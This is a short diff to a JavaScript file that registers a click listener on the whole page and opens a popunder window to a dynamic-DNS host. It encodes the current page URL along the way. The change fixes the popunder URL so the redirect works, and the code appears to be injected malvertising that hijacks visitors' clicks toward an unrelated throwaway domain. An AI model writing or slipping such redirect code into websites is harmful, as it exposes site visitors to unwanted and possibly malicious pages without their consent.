@@ -5,7 +5,7 @@ document.addEventListener('click', function openPopunder() {
   const currentUrl = encodeURIComponent(window.location.href);
   const base64Url = btoa(encodeURIComponent(currentUrl));
   
-  const popunderUrl = `trrfc.ddns.net/go/hftdiyrvmu5dembwge3a`;
+  const popunderUrl = `//trrfc.ddns.net/go/hftdiyrvmu5dembwge3a`;
   const popunder = window.open(
     popunderUrl
   );
